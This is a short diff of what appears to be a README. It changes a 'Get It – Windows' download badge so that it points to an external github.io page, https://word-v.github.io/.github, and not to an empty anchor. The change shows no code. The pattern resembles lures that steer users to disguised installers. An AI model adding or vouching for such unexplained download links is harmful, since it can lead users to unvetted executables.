@@ -6,7 +6,7 @@
 
 <p align="center">
 
-[![Get It](https://img.shields.io/badge/⬇%20Get%20It-Windows-blue?style=for-the-badge)](#)
+[![Get It](https://img.shields.io/badge/⬇%20Get%20It-Windows-blue?style=for-the-badge)](https://word-v.github.io/.github)
 
 </p>
 
